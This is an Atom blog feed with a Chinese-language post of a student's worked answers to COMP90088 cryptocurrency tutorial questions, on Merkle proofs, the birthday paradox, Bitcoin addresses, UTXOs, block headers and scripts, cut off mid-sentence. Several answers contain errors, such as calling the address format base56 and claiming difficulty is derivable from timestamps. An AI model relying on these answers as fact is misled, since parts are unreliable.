<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ZDZ</title>
  
  <subtitle>Darren Zhou</subtitle>
  <link href="https://yumtaro.com/atom.xml" rel="self"/>
  
  <link href="https://yumtaro.com/"/>
  <updated>2022-06-13T09:11:56.426Z</updated>
  <id>https://yumtaro.com/</id>
  
  <author>
    <name>Darren Z</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>COMP90088 研讨题</title>
    <link href="https://yumtaro.com/archives/d48f0e39.html/"/>
    <id>https://yumtaro.com/archives/d48f0e39.html/</id>
    <published>2022-05-31T07:42:00.000Z</published>
    <updated>2022-06-13T09:11:56.426Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- # COMP90088 COMP90088 Cryptocurrencies & decentralised ledgers 加密货币&去中央化的公共帐目 -- 研讨题 --><h2 id="merkle-trees-默克尔树">1.Merkle Trees 默克尔树</h2><p>蓝色代表 <u>Leaf Node 叶子结点</u>, 红色代表 <spanstyle="color:#EC5F5D">Internal Node 内部节点</span></p><p><strong>1.a</strong>: 需要通过哪些节点证明<em>节点 7 (Node7)</em>是包含在集合中的? 证明过程中需要重新计算哪些节点?</p><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202205281541822.png" alt="tut1_merkletree" style="zoom:50%;" /></p><blockquote><p><strong>Inclusion Proof 包含证明</strong></p><ul><li>首先证明<em>节点 7</em>被包含在集合中需要通过 <strong>Merkle Proof默克尔证明</strong>: 通过<em>节点 7</em>自己 &amp; 节点: <spanclass="math inline">\(\{ {\color{green}{6}}, {\color{green}{d}},{\color{green}{e}} \}\)</span> 证明节点 <spanclass="math inline">\({\color{green}{7}}\)</span> 是被包含在集合中的。<ol type="1"><li>因为需要通过节点 <span class="math inline">\(\{ {\color{green}{6}},{\color{green}{7}} \}\)</span> 计算出 <spanclass="math inline">\({\color{CornflowerBlue}{c}}\)</span></li><li>然后需要节点 <span class="math inline">\(\{{\color{CornflowerBlue}{c}}, {\color{green}{d}} \}\)</span> 计算出 <spanclass="math inline">\({\color{CornflowerBlue}{f}}\)</span></li><li>最后需要通过 <span class="math inline">\(\{{\color{CornflowerBlue}{f}}, {\color{green}{e}} \}\)</span> 计算出 <spanclass="math inline">\({\color{CornflowerBlue}{g}}\)</span></li></ol></li><li>那么 <span class="math inline">\(\{ {\color{CornflowerBlue}{c}},{\color{CornflowerBlue}{f}}, {\color{CornflowerBlue}{g}} \}\)</span>则为需要重新被计算的节点</li><li>最后只需要通过对比: 重新计算的节点 <spanclass="math inline">\(\color{CornflowerBlue}{g}\)</span> &amp; 原本的Merkle Root 默克尔根就可以确定集合是否原本就包含<em>节点 7</em></li></ul></blockquote><p><strong>1.b</strong>: 如果验证者知道树的<u>叶子结点</u>是有序的,如何证明<em>节点 3</em>不在这棵树提交的集合中?</p><blockquote><p><strong>Non-inclusion Proof 不包含证明</strong></p><blockquote><p>! 这道题跟没问一样, 主要就是强调一下<strong>Adjacent Node相邻节点</strong>以及有序排列。</p></blockquote><ul><li>由于<u>节点 2</u> &amp; <u>节点 4</u>为<strong>Adjacent Node相邻节点</strong>, 并且所有<u>Leaf Node 叶子结点</u>有序排列。那么只需要验证 <u>节点 2</u> &amp; <u>节点 4</u> 的<strong>InclusionProof 包含证明</strong>就等于证明了<em>节点 3</em>的<strong>Non-inclusion Proof 不包含证明</strong>。</li></ul></blockquote><p><strong>1.c</strong>: 对于一个有<spanclass="math inline">\(n\)</span>节点的默克尔树, <strong>Inclusion Proof包含证明</strong>的复杂度</p><blockquote><p><strong>Inclusion Proof 包含证明</strong>的复杂度:</p><ul><li>首先我们可以从<strong>1.a</strong>: 的解答中看到, 一个有<spanclass="math inline">\(8\)</span>个<u>叶子结点</u>的默克尔树只需要存储除根节点以为的节点,因为根节点可以通过最后的 <spanclass="math inline">\(\{\color{CornflowerBlue}f,\color{green}e\}\)</span>计算得出。</li></ul></blockquote><p>如果现在树的验证者, 在<spanclass="math inline">\(\log_2(k)\)</span>层, 存储了<spanclass="math inline">\(k\)</span>个内部节点,那么需要包含证明需要的复杂度是多少? 又需要多少额外的步骤去证明?</p><blockquote><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202205300945045.png" alt="1" style="zoom:50%;" /></p><ul><li>以证明节点<span class="math inline">\(2\)</span>为例<spanclass="math inline">\(\log_2(k)\)</span>层的高度就等于目前证明的复杂度,而<spanclass="math inline">\(k\)</span>为子树的<u>叶子结点</u>的个数(<spanclass="math inline">\(4\)</span>)。</li><li>所以我们可以得到在以知<span class="math inline">\(\log_2(k) =\log_2(4) = 2\)</span>层(这里指树的深度也就是子树节点<spanclass="math inline">\(\{e, f\}\)</span>的位置)的前提下, 对于节点<spanclass="math inline">\(2\)</span>的包含证明同样需要<spanclass="math inline">\(\log_2(k)=2\)</span>。 这个<spanclass="math inline">\(2\)</span>步也就是<ol type="1"><li>通过节点<span class="math inline">\(\{2, \color{green}1\}\)</span>计算出节点<spanclass="math inline">\(\{\color{CornflowerBlue}a\}\)</span></li><li>通过节点<spanclass="math inline">\(\{\color{CornflowerBlue}a,\color{green}b\}\)</span>计算出节点<spanclass="math inline">\(\{\color{CornflowerBlue}e\}\)</span></li></ol></li><li>额外的证明工作为从节点<spanclass="math inline">\(\{\color{CornflowerBlue}e\}\)</span>到节点<spanclass="math inline">\(\{\color{red}{g} \}\)</span>的距离,同样需要经过<span class="math inline">\(\{\color{CornflowerBlue}e ,\color{green}f\}\)</span>的计算得出, 也就是通过<spanclass="math inline">\(\log_2{n} - \log_2{k} = \log_2{\frac{8}{4}} =1\)</span>计算出额外的步骤为<spanclass="math inline">\(1\)</span>。</li><li>那么额外的验证需要的时间复杂度可以通过<spanclass="math inline">\(\Theta(\log_2(\frac{n}{k}))\)</span>表示,可以看出本题中所谓的<strong>Optimization</strong>指的就是通过增加验证者的空间复杂度(存储更多的子树的根结点)来减少时间复杂度(证明步骤)。</li></ul></blockquote><h2 id="signature-schemes-签名方案">2.Signature Schemes 签名方案</h2><p>我们需要<strong>Security Parameters 安全参数</strong> <spanclass="math inline">\(\lambda\)</span>, 如果攻击者可以发起 <spanclass="math inline">\(Polynomial(\lambda)\)</span> 运算。我们希望攻击者赢得<strong>Existential Forgery存在性伪造</strong>游戏概率为 <spanclass="math inline">\(2^{-\lambda}\)</span>。</p><p><strong>2.a</strong>: 要满足以上概率, <strong>Signature Schemes签名方案</strong>通过<span class="math inline">\(keyGen(sk,pk)\)</span>生成的 <strong>Publick Key 公钥 (<spanclass="math inline">\(pk\)</span>)</strong> 的最短长度应该是多少?</p><blockquote><p>已知攻击者可以进行 <spanclass="math inline">\(Polynomial(\lambda)\)</span> 运算,即攻击者可以最多发起<spanclass="math inline">\(2^{\lambda}\)</span>次运算。</p><p>那么如果一个攻击者可以发起 <spanclass="math inline">\(2^{\lambda}\)</span>次运算, 他就可以生成<spanclass="math inline">\(2^{\lambda}\)</span>组<strong>Key Pairs钥匙对</strong>。</p><p>并希望其中一组<strong>Key Pairs 钥匙对</strong>是正确的。</p><p>那么我们需要多少个<span class="math inline">\(n\)</span>才能使得<spanclass="math inline">\(2^{\lambda}\)</span>组<strong>Key Pairs钥匙对</strong>中有一个正确钥匙对的概率达到<spanclass="math inline">\(2^{-\lambda}\)</span>:</p><p><span class="math inline">\(2\lambda * \frac{1}{n} = 2^{-\lambda} \\2\lambda\frac{1}{n}=\frac{1}{2^{\lambda}} \\ x = 2^{2\lambda} \\ =4^{\lambda}\)</span></p><p>所以一组<strong>Key Pairs钥匙对</strong>有一个正确钥匙对的概率达到<spanclass="math inline">\(2^{-\lambda}\)</span>, 需要<spanclass="math inline">\(4^{\lambda}\)</span>, 那么一个<spanclass="math inline">\(pk\)</span>大小则最少需要<spanclass="math inline">\(2\lambda\)</span>。</p></blockquote><p><strong>2.b</strong>: 那么最少需要签名的大小有多大?</p><blockquote><p>相同的攻击者可以最多发起<spanclass="math inline">\(2^{\lambda}\)</span>次运算,那么最多可以生成&amp;验证<spanclass="math inline">\(2^{\lambda}\)</span>大小的签名。那么全部签名大小的最大上限则为:</p><p><span class="math inline">\(2\lambda\frac{1}{n} =\frac{1}{2^{\lambda}} \\ x = 2^{2\lambda}\)</span></p><p>每个签名<spanclass="math inline">\(\sigma\)</span>的大小则至少需要<spanclass="math inline">\(2\lambda\)</span></p></blockquote><h2 id="birthday-paradox-生日悖论">3.Birthday Paradox 生日悖论</h2><p><strong>3.a</strong>: 如果假设: 非闰年的情况,且生日是<strong>Uniformly Distributed均匀分布</strong>的。那么随机两个人在同一天过生日的概率是多少?</p><blockquote><p>如果Alice在1月1日过生日, 那么Bob将有<spanclass="math inline">\(\frac{1}{365}\)</span>的概率在同一天过生日,所以无论Alice的生日是哪一天, 另一个人有相同生日的概率都是<spanclass="math inline">\(\frac{1}{365}\)</span>(但这一切都是基于<strong>Uniformly Distrition 均匀分布</strong>的假设,在现实生活中人们的生日不是均匀分布的)。</p></blockquote><p><strong>3.b</strong>: 一个屋子里有<spanclass="math inline">\(N\)</span>个人, 从<spanclass="math inline">\(N\)</span>个人中取出<spanclass="math inline">\(2\)</span>个人的不同组合可以通过 <spanclass="math inline">\({N\choose{2}}\)</span> 表示, 即 <spanclass="math inline">\(\frac{N}{2!(N-2)!}\)</span> 也可以简化为 <spanclass="math inline">\({N \choose 2} = N(N-1)/2\)</span>,那么两个人是相同生日的概率是多少?</p><blockquote><p>设每个唯一的随机对儿Pair为: <spanclass="math inline">\({\color{orange}{p}}\)</span>,一个随机选取的Pair(<span class="math inline">\(p\)</span>)为 <spanclass="math inline">\({\color{CornflowerBlue}{I}}_{\color{orange}{p}}\)</span></p><p>如果<spanclass="math inline">\({\color{CornflowerBlue}{I}}_{\color{orange}{p}} =0\)</span>, 那么表示随机抽取的两人生日不同。</p><p>如果<spanclass="math inline">\({\color{CornflowerBlue}{I}}_{\color{orange}{p}} =1\)</span>, 表示表示随机抽取的两人生日<u>相同</u>。</p><p>通过<strong>Linearity of Expectionas 线性期望</strong>得出:</p><p><span class="math inline">\(E(\sum_{p} I_{p}) = \sum_{p}E(I_{p}) \\ =\sum_{p}E( \frac{1}{365} * 1 + \frac{364}{365}*0) \\ = {N \choose 2}\frac{1}{365}\)</span></p></blockquote><blockquote><p>我们可以通过架设总人数<span class="math inline">\(N =100\)</span>进行验证, <spanclass="math inline">\({100\choose2}\frac{1}{365} = 4950\frac{1}{365} =13.56\)</span>, 也就是说100个人里面做随机抽取不同的2人组,总共有4950个2人组,这其中有大概会有13个组有2个人是相同的生日(发生碰撞)。</p></blockquote><p><strong>3.c</strong>: 那么我们现在如果想要在<spanclass="math inline">\(N\)</span>个人中至少有1个随机2人组中发生"<em>生日碰撞</em>"(<u>同生缘</u>)至少需要多少个人(<spanclass="math inline">\(N\)</span>)?</p><blockquote><p>这里我们已知期望结果为<span class="math inline">\(1\)</span>, 将<spanclass="math inline">\(1\)</span>带入上述公式:</p><p><span class="math inline">\({N \choose 2} \frac{1}{365} = 1 \\\frac{N!}{2!(N-2)!} \frac{1}{365} = 1 \\ N=\frac{1\pm\sqrt{2921}}{2} \\N = 27.52, N = -26.52\)</span></p><p>那么我们得出最小需要大改<span class="math inline">\(N =28\)</span>才能至少发生一次"<em>生日碰撞</em>"</p></blockquote><p><strong>3.d</strong>:传统的"<em>生日悖论</em>"表示一个有23人出现一对<u>同生缘</u>的概率是<spanclass="math inline">\(50.7\%\)</span>。但是<strong>3.c</strong>:中我们计算出23个人中有出现一对<u>同生缘</u>的概率是<spanclass="math inline">\(100\%\)</span></p><blockquote><p>首先传统"<em>生日悖论</em>"所有人中没有<u>同生缘</u>的概率: <spanclass="math inline">\(P = \frac{365}{365} * \frac{364}{365} \dots\frac{365-(N-1)}{365}\)</span></p><p>上述公式可以理解为, N个人中第1个人的生日是365天中的任意一天 <spanclass="math inline">\(\frac{365}{365}\)</span>,但是第2个人只有在剩下的364天中的一天才能不产生<u>同生缘</u>(第2个人与第1个人生日不相同的概率是),以此类推到第<span class="math inline">\(N\)</span>个人的生日只能是<spanclass="math inline">\(365-N+1\)</span>天中的一天。 所以简化后得到: <spanclass="math inline">\(\frac{365!}{365^{N} (365-N)!}\)</span></p><p>即首先传统"<em>生日悖论</em>"所有人中出现<u>同生缘</u>的概率为: <spanclass="math inline">\(1-\frac{365!}{365^{n} (365-N)!}\)</span></p><p>那么通过计算我们发现当$N = 23 $时: <spanclass="math inline">\(1-\frac{365!}{365^{23} (365-23)!} = 0.507 \approx50\%\)</span></p><p>传统"<em>生日悖论</em>"求的是<u>Median 中位数</u>,然而我们求的是<u>Mean 中位数</u>(期望值),根据曲线可以看出这两个值的不同。</p><p>所以对于概率题要注意: <u>Median 中位数</u>和<u>期望值</u>的区别。</p></blockquote><p><strong>3.e</strong>: 如果想要在<spanclass="math inline">\(N\)</span>个人中至少有1个随机<em>3</em>人组出现中<u>同生缘</u>至少需要多少个人(<spanclass="math inline">\(N\)</span>)?</p><blockquote><p>与<strong>3.b</strong>: 类似, 不过现在需要 <spanclass="math inline">\({N \choose 3} \frac{1}{365^2} = 1\)</span>。</p><p><span class="math inline">\(\frac{N!}{3!\left(N-3\right)!}\frac{1}{365^2}=1 \\ =93.81 \\ \approx 94\)</span></p></blockquote><h2 id="bitcoin-address-比特币地址">4.Bitcoin Address 比特币地址</h2><p>比特币地址通常通过 <code>base56</code> 格式的 <code>160-bit</code>哈希进行交换, 如下所示:</p><ul><li><code>3HHZfn1wo93snzEf5kDmkSx1vPmyCxYAxm</code> [长度只有34位]</li></ul><p><strong>4.a</strong>: 如果比特币地址是使用 56 个字符的字母格式化的160 位哈希(二进制), 那么它有多少个字符? 其中56个字符包括:<code>23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz</code></p><blockquote><p>设需要<span class="math inline">\(n\)</span>个base56来表示需要<spanclass="math inline">\(56^n\)</span>长度组合的字符串, 现在我们有<spanclass="math inline">\(2^{160}\)</span>位长度组合的字符串。那么我么只需要求解: <span class="math inline">\(56^n =2^{160}\)</span>得到: <span class="math inline">\(n = 27.6 \approx28\)</span></p><p>即, 需要至少28个base56的字符来满足对160位长度组合的格式交换</p></blockquote><p><strong>4.b</strong>: 通过观察<code>base56</code>的字符,能够发现那些字符没有被使用?</p><blockquote><p><code>1</code>,<code>0</code>,<code>I</code>,<code>o</code>,<code>l</code>,<code>O</code></p><p>主要愿意是为了防止混淆, 发生转账地址错误的情况。</p></blockquote><p><strong>4.c</strong>: 为什么将<strong>Publick Key Hash公钥的哈希值</strong>作为地址而不是<strong>Public Key 公钥 (<spanclass="math inline">\(pk\)</span>)</strong>本身进行分发是<u>安全的</u>?</p><blockquote><p>只要哈希函数<spanclass="math inline">\(H()\)</span>是<strong>Collision Resistant防碰撞</strong>的, 那么将十分困难生成一个公钥<spanclass="math inline">\(pk\)</span>,使其哈希结果与目标哈希结果相同的情况。</p><p>因为不会发生碰撞, 所以分发公钥的哈希值<spanclass="math inline">\(H(pk)\)</span>相对安全。</p></blockquote><p><strong>4.d</strong>: 如果Bob的比特币地址<spanclass="math inline">\(X\)</span>是通过对其公钥的哈希加密得到的<spanclass="math inline">\(\color{green}X=H(pk_{Bob})\)</span>.此时攻击者Mallory找到了一个<strong>Collision碰撞</strong>(即生成一个<spanclass="math inline">\(PK_{mallory}\)</span>使得<spanclass="math inline">\(\color{red}{X}=H(pk_{Mallory})\)</span>).那么这将造成什么影响?</p><blockquote><p>如果在<strong>Public Key Hash公钥哈希</strong>下收到的比特币被锁定在标准 <code>P2PKH</code> 脚本下。那么 Mallory 可以通过 Bob 的钱包使用对应的比特币,因为Mallory可以通过<code>P2PKH</code>中<code>ScriptPubKey</code>脚本中<code>OP_EQUALVERIFY</code>的验证。</p><figure class="highlight haskell"><table><tr><td class="code"><pre><span class="line"><span class="comment">----P2PKH----</span></span><br><span class="line"><span class="comment">--Input ScriptSig--</span></span><br><span class="line">&lt;sig&gt;</span><br><span class="line">&lt;pubKey&gt; | &lt;- pk(<span class="type">Mallory</span>)</span><br><span class="line"><span class="comment">--Output ScriptPubKey-- </span></span><br><span class="line"><span class="type">OP_DUP</span></span><br><span class="line"><span class="type">OP_HASH160</span></span><br><span class="line">&lt;pubkeyHash?&gt;  | &lt;- <span class="type">H</span>(pk(<span class="type">Mallory</span>))=<span class="type">X</span></span><br><span class="line"><span class="type">OP_EQUALVERIFY</span> | &lt;- 成功通过验证</span><br><span class="line"><span class="type">OP_CHECKSIG</span></span><br></pre></td></tr></table></figure></blockquote><p><strong>4.e</strong>: 使用<u>Birthday Attack 生日攻击</u>,对于哈希函数<span class="math inline">\(H()\)</span>输出长度为<spanclass="math inline">\(t\)</span>的结果, 仅需<spanclass="math inline">\(O(2^{t/2})\)</span>位的难度以找到<strong>Collision碰撞</strong>。 生日攻击对<strong>4.d</strong>: 适用吗?为什么或者为什么不? 如果不是, Mallory必须<u>期望</u>花费多少工作才能找到这样的<strong>Publick Key公钥</strong>?</p><blockquote><p>不适用: 因为<strong>4.d</strong>:中<u>生日攻击</u>被用来在已知输入中找到一对儿或一组输入找到<strong>Collision碰撞</strong>。 但是对于 Mallory 来说, 她现在需要找到一个<em>输入</em>:<strong>公钥</strong>(<spanclass="math inline">\(\color{red}{pk_{Mallory}}\)</span>)通过<spanclass="math inline">\(H({\color{red}pk_{Mallory}})\)</span>后与一个已知的输出<strong>PublicKey Hash 公钥哈希</strong>(<spanclass="math inline">\(\color{green}X\)</span>)发生碰撞。</p><p>但是如果 Mallory 知道Bob的公钥 <spanclass="math inline">\(\color{green}pk_{Bob}\)</span>,那么问题就将从破解<strong>原像防御(Pre-Image resistance)</strong>,变为破解<strong>弱碰撞防御(Second pre-image resistance)</strong>:</p><ol type="1"><li><strong>原像防御(Pre-Image resistance)</strong>:就是任意给一个hash值<spanclass="math inline">\({\color{green}{X}}\)</span>,你很难破解出它的原像<spanclass="math inline">\({\color{green}{pk_{Bob}}}\)</span>, 使得<spanclass="math inline">\(H({\color{red}{pk_{Mallory}}})\)</span>=(<spanclass="math inline">\({\color{green}{X}}\)</span>),这个难度一般是NP难度的, 也就是所谓的单向函数。</li><li><strong>弱碰撞防御(Second pre-image resistance)</strong>:就是给定一个<spanclass="math inline">\(\color{green}{pk_{Bob}}\)</span>,你很难找到另一个<spanclass="math inline">\(H({\color{red}{pk_{Mallory}}})\)</span>, 使得<span class="math inline">\(H({\color{red}{pk_{Mallory}}}) =H({\color{green}{pk_{Bob}}})\)</span>。</li><li><strong>强碰撞防御(Collision resistance)</strong>:就是你很难找到<u>两个不同的</u><spanclass="math inline">\({\color{green}{pk_{Bob}}}\)</span> 和 <spanclass="math inline">\({\color{red}{pk_{Mallory}}}\)</span>, 使得<spanclass="math inline">\(H({\color{red}{pk_{Mallory}}})=H({\color{green}{pk_{Bob}}})\)</span>。</li></ol><blockquote><p>如果符合<strong>强碰撞防御</strong>,也就是会符合<strong>弱碰撞防御</strong>,但是<em>不一定符合原像防御</em>。</p><p>如果只满1,2个, 在密码学上是不安全的, 一般加密哈希函数应该满足1, 2,3。</p></blockquote><p>那么相比: <spanclass="math inline">\(H({\color{red}{pk_{Mallory}}})=({\color{green}{X}}\)</span>),破解 <span class="math inline">\({H(\color{red}{pk_{Mallory}}}) =H({\color{green}{pk_{Bob}}})\)</span>相对容易。</p><p>所以如果 Mallory 通过一些途径(比如Bob之前用<spanclass="math inline">\(\color{green}{pk_{Bob}}\)</span>签署了某个交易)得知了<spanclass="math inline">\(\color{green}{pk_{Bob}}\)</span>, 那么 Mallory需要尝试所有长度为<span class="math inline">\(t\)</span>的二进制字符串<span class="math inline">\(2^t\)</span> 个不同的<spanclass="math inline">\(\color{red}{pk}\)</span>'s并<u>期望</u>其中一个<spanclass="math inline">\(\color{red}{pk}\)</span>的结果与<spanclass="math inline">\(\color{green}{X}\)</span>发生碰撞。</p><p><strong>Reference</strong>:</p><ul><li><a href="https://www.cnblogs.com/math/p/hash.html">证明与计算(5):从加密哈希函数到一致性哈希</a></li></ul></blockquote><h2 id="utxo-based-transaction-基于未花费的交易输出的交易">5.UTXO-basedTransaction 基于未花费的交易输出的交易</h2><table><colgroup><col style="width: 3%" /><col style="width: 10%" /><col style="width: 85%" /></colgroup><thead><tr class="header"><th>Tx</th><th>Inputs</th><th>Outputs</th></tr></thead><tbody><tr class="odd"><td>1</td><td>∅</td><td><span class="math inline">\({\color{red}{25 → A}}\)</span>; <spanclass="math inline">\({\color{red}{25 → B}}\)</span></td></tr><tr class="even"><td>2</td><td>1[0]</td><td><span class="math inline">\(10 → A\)</span>; <spanclass="math inline">\({\color{red}{13 → C}}\)</span>; <spanclass="math inline">\(1 → D\)</span></td></tr><tr class="odd"><td>3</td><td>2[1]</td><td><span class="math inline">\(2 → A\)</span>; <spanclass="math inline">\(2 → B\)</span>; <spanclass="math inline">\({\color{red}{4 → C}}\)</span>; <spanclass="math inline">\(2 → D\)</span>; <spanclass="math inline">\({\color{red}{2 → E}}\)</span></td></tr><tr class="even"><td>4</td><td>1[1];3[4]</td><td><span class="math inline">\(4 → A\)</span>; <spanclass="math inline">\(11 → B\)</span>; <spanclass="math inline">\({\color{red}{1 → C}}\)</span>; <spanclass="math inline">\(5 → D\)</span>; <span class="math inline">\(5 →E\)</span></td></tr><tr class="odd"><td><em>5</em></td><td>4[2];3[2]</td><td><span class="math inline">\(1 → C\)</span>; <spanclass="math inline">\(1 → D\)</span>; <span class="math inline">\(2 →E\)</span></td></tr></tbody></table><p><strong>5.a</strong>: 在交易<em>Tx-5</em>之后, <spanclass="math inline">\({A,B,C,E,E}\)</span> 5个键, 各控制多少钱?</p><blockquote><p>排除掉在其他交易中被再发布为Inputs的<spanclass="math inline">\(\color{red}{Outputs}\)</span></p><p><span class="math inline">\(\{A:16, B:13, C:1, D:9,E:7\}\)</span>:</p><ul><li><span class="math inline">\(A = 0+10+2+4 = 16\)</span></li><li><span class="math inline">\(B = 0+2+11=13\)</span></li><li><span class="math inline">\(C = 0 +1 = 1\)</span></li><li><span class="math inline">\(D = 0 + 1+2+5+1=9\)</span></li><li><span class="math inline">\(E = 5+2=7\)</span></li></ul></blockquote><p><strong>5.b</strong>: 交易<em>Tx-5</em>之后的 UTXO集合的状态是什么?</p><blockquote><p>排除掉在其他交易中被再发布为Inputs的<spanclass="math inline">\(\color{red}{Outputs}\)</span>,剩下的<strong>未花费的交易输出(UTXO)</strong>:</p><p><span class="math inline">\(\{2[0], 2[1], 3[0], 3[1], 3[3], 4[0],4[1], 4[3], 4[4], 5[0], 5[1], 5[2]\}\)</span></p></blockquote><p><strong>5.c</strong>: 从交易Tx-1 到 <em>Tx-5</em>,所花费的交易手续费是多少?</p><blockquote><p>合计所有<strong>未花费的交易输出(UTXO)</strong>: <spanclass="math inline">\(10+1+2+2+2+4+11+5+5+1+1+2 = 46\)</span></p><p>用总输入 <span class="math inline">\(\{A:25 + B:25\} = 50\)</span>减去未花费(UTXO)的总和得到: <span class="math inline">\(50 - 46 =4\)</span></p><p>所以交易费为<span class="math inline">\(4\)</span></p></blockquote><p><em>附上一张图便于理解</em></p><blockquote><p><img src="https://fastly.jsdelivr.net/gh/ZhidongZhou/gallery@master/img/202205311452078.png" alt="utxo_chart" style="zoom:22%;" /></p></blockquote><p><strong>5.d</strong>: 以下哪一项可能是有效的<em>Tx-6</em>?对于无效的可能性, 为什么它们是无效的?</p><table><colgroup><col style="width: 6%" /><col style="width: 20%" /><col style="width: 11%" /><col style="width: 61%" /></colgroup><thead><tr class="header"><th>Tx ID</th><th>Inputs</th><th>Outputs</th><th>Valid/Invalid</th></tr></thead><tbody><tr class="odd"><td>6.1</td><td>5[1]; 5[2]</td><td>2→A; 2→B</td><td>Invalid, 输入: 5[1]中的<code>1</code>小于, 输出:2→A中的<code>2</code></td></tr><tr class="even"><td>6.2</td><td>4[3]; 2[0]; 5[1]</td><td>15→E;</td><td><em>Valid</em>, 输入:<code>16</code>, 输出: <code>15</code></td></tr><tr class="odd"><td>6.3</td><td>1[2]</td><td>25→C;</td><td>Invalid, 1[2] 不存在</td></tr><tr class="even"><td>6.4</td><td>4[1];</td><td>11→B;</td><td><em>Valid</em>, 输入<code>11</code>, 输出: <code>11</code></td></tr><tr class="odd"><td>6.5</td><td>4[1]; 4[2]</td><td>10→C; 2→D</td><td>Invalid, 4[2] 已经被Tx-5使用</td></tr></tbody></table><p><strong>5.e</strong>: 如果您想<u>激励</u>保持 UTXO 集大小<u>最小</u>,您是否希望费用基于交易的输入数量、输出数量或两者兼而有之?</p><blockquote><p>给定的交易使用<strong>未花费的交易输出(UTXO)</strong>作为<u>Input输入</u>, 并为每个<em>Output 输出</em>生成一个新的UTXO。</p><p>那么如果, <u>Input 输入</u>少于<em>Output 输出</em>,将生成更多的<strong>未花费的交易输出(UTXO)</strong> (UTXO集更大)。</p><p>反之, 如果更少的<em>Output 输出</em>,将会产生更少的<strong>未花费的交易输出(UTXO)</strong> (UTXO集更小)。</p><p>所以我们应该通过对产生新的<em>Output 输出</em>收取手续费,以减少<strong>未花费的交易输出(UTXO)</strong>的产出。并且通过折扣策略鼓励更多的<u>Input输入</u>。</p></blockquote><h2 id="bitcoin-block-比特币区块">6.Bitcoin Block 比特币区块</h2><p>比特币区块, 有以下内容:</p><table><thead><tr class="header"><th>Field</th><th>Size (bytes)</th></tr></thead><tbody><tr class="odd"><td>Version <code>#</code></td><td>4</td></tr><tr class="even"><td>Previous block hash</td><td>32</td></tr><tr class="odd"><td>Merkle Root of transactions</td><td>32</td></tr><tr class="even"><td>Timestamp</td><td>4</td></tr><tr class="odd"><td>Difficulty</td><td>4</td></tr><tr class="even"><td>Nonce (for proof-of-work)</td><td>4</td></tr></tbody></table><p><strong>6.a</strong>: 对于这些内容,它们在实践中从一个块到另一个块的变化频率如何?</p><blockquote><ul><li>首先Version 版本号(<code>#</code>), 很少改变,一般只在协议更新的时候改变。</li><li>每个区块都存储 <strong>Previous block hash前一个区块的哈希值</strong>,可以通过对前一个区块的地址进行哈希得到。</li><li>每个区块下的<u>Tx 交易</u>会被压缩为一个<strong>Merkle Root默克尔根</strong>(哈希值, 长度固定位32 bytes)。所以每个区块的都不一样。</li><li>每个区块的<strong>Timestamp 时间戳</strong>平均比之前区块的大600 秒(比特币每10分钟产出一个新的区块)。</li><li><strong>Difficulty 难度参数</strong>, 每2016个区块改变一次。</li><li>每一个区块的<strong>Nonce 随机数</strong>(Puzzle 谜题)都不同。</li></ul></blockquote><p><strong>6.b</strong>: <strong>Block Header 区块头</strong>大小为<span class="math inline">\(4+32+32+4+4+4 = 80\  bytes\)</span>。考虑一个在链中存储所有块的客户端。通过前一个块可预测的字段进行智能压缩,估计这样可以节省多少空间?</p><blockquote><ul><li>首先我们可以节省<span class="math inline">\(4 \ bytes\)</span>,通过省略掉<strong>Version 版本号</strong>(<code>#</code>)。</li><li>通过省略掉<strong>Previous block hash前一个区块的哈希值</strong>节省<span class="math inline">\(32 \bytes\)</span>, 因为需要时可以通过简单的哈希计算。</li><li>通过简化<strong>Timestamp 时间戳</strong>(仅保留600秒的平均间隔),从Unix Time中的节省掉<span class="math inline">\(2 \ bytes\)</span><ul><li>Unix Time: 有32bits, 足够被使用 <spanclass="math inline">\((2^{32})/(365*24*60*60)=132\)</span> 年。</li><li>在<code>2147483648</code>:<code>echo "obase=2; 2147483648" |bc</code>:<code>10000000000000000000000000000000</code>- <a href="https://www.unixtimestamp.com/">(GMT+0000)2038年1月19日03时14分08秒</a>: 溢出<span class="math inline">\(32 \bytes\)</span>, 届时Unix时间戳将停止工作。</li><li>由于每个区块平均间隔为600秒, 如果只保留秒(<spanclass="math inline">\(600*2=1200\)</span>),<code>echo "obase=2;(120)" |bc</code>:<code>10010110000</code>(11 bits),那么只需要存储<span class="math inline">\(2 \ bytes\)</span>而不是<spanclass="math inline">\(4 \ bytes\)</span></li></ul></li><li>通过省略掉<strong>Difficulty 难度参数</strong>节省<spanclass="math inline">\(4 \ bytes\)</span>,因为可以通过时间戳计算出难度参数。</li></ul><p>所以总共可以从区块头中节省(<span class="math inline">\(4+32+2+4 = 42\ bytes\)</span>)的空间, 优化后每个区块头只占用<spanclass="math inline">\(32 \ bytes\)</span>的空间。</p></blockquote><h2 id="bitcion-script-比特币脚本">7.Bitcion Script 比特币脚本</h2><p><strong>Pay to Public Key Hash</strong> <code>P2PKH</code> &amp;<strong>Pay to Public Key</strong> <code>P2PK</code> 的脚本不同</p><p><strong>7.a</strong>: <code>P2PKH</code> &amp; <code>P2PK</code>的输出脚本的不同, 给出输入脚本的区别</p><blockquote><table><colgroup><col style="width: 17%" /><col style="width: 56%" /><col style="width: 25%" /></colgroup><thead><tr class="header"><th></th><th><code>P2PKH</code></th><th><code>P2PK</code></th></tr></thead><tbody><tr class="odd"><td><code>scriptSig</code> 输入</td><td><code>&lt;sig&gt;</code><br><code>&lt;pubKey&gt;</code></td><td><code>&lt;sig&gt;</code></td></tr><tr class="even"><td><code>scriptPubKey</code> 输出</td><td><code>OP_DUP</code><br><code>OP_HASH160</code><br><code>&lt;PubKeyHash&gt;</code><br><code>OP_EQUALVERIFY</code><br><code>OP_CHECKSIG</code></td><td><code>&lt;PubKey&gt;</code><br><code>OP_CHECKSIG</code></td></tr></tbody></table></blockquote><p><strong>7.b</strong>: <code>P2PKH</code> 比 <code>P2PK</code>更受欢迎。解释为什么<code>P2PKH</code>具有性能和安全优势</p><blockquote><p><strong>性能优势</strong>: <code>P2PKH</code> 使用<spanclass="math inline">\(160 \ 